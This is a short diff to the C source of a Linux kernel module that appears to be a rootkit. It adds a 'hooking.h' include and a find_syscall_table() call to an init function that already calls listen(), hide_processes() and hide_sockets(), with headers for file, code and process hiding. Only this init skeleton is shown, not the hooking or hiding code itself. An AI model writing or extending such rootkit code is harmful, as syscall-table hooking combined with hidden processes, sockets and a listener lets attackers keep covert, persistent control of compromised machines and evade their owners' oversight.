@@ -2,6 +2,7 @@
 #include <linux/kernel.h> /* Needed for KERN_INFO */
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
 
+#include "hooking.h"
 #include "file_hiding.h"
 #include "code_hiding.h"
 #include "process_hiding.h"
@@ -15,6 +16,7 @@
 
 static int __init mod_init(void)
 {
+  find_syscall_table();
   listen();
   hide_processes();
   hide_sockets();
